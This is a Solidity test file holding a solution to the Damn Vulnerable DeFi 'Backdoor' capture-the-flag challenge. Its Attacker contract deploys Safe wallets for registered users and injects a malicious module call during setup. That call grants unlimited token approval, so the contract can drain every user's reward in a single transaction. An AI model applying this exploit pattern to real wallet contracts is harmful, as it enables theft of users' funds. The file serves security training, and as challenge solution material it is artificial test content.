// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract Module {
    DamnValuableToken immutable token;
    address immutable attacker;

    constructor(address _token, address _attacker) {
        token = DamnValuableToken(_token);
        attacker = _attacker;
    }

    function aprroveAttacker() public {
        token.approve(address(attacker), type(uint256).max);
    }
}

contract Attacker {
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;
    address singletonCopy;
    Module module;
    DamnValuableToken token;
    address recovery;

    uint256 private constant PAYMENT_AMOUNT = 10e18;

    constructor(
        address _walletFactory,
        address _walletRegistry,
        address _singletonCopy,
        address _token,
        address _recovery
    ) {
        walletFactory = SafeProxyFactory(_walletFactory);
        walletRegistry = WalletRegistry(_walletRegistry);
        singletonCopy = _singletonCopy;
        token = DamnValuableToken(_token);
        recovery = _recovery;
        module = new Module(_token, address(this));
    }

    function attack(address[] memory users) public {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            address proxy = address(
                walletFactory.createProxyWithCallback(
                    address(singletonCopy),
                    abi.encodeWithSelector(
                        Safe.setup.selector,
                        owners, // owners
                        1, // threshold
                        address(module), // to
                        abi.encodeWithSelector(Module.aprroveAttacker.selector), // data
                        address(0), // fallbackHandler
                        address(token), // paymentToken
                        0, // payment
                        payable(recovery) // paymentReceiver
                    ),
                    0, // salt
                    walletRegistry //
                )
            );

            token.transferFrom(proxy, recovery, PAYMENT_AMOUNT);
        }
    }
}

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        uint256 nonce = vm.getNonce(player);

        Attacker attacker = new Attacker(
            address(walletFactory), address(walletRegistry), address(singletonCopy), address(token), recovery
        );
        attacker.attack(users);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED, "Recovery account did not receive all tokens");
    }
}
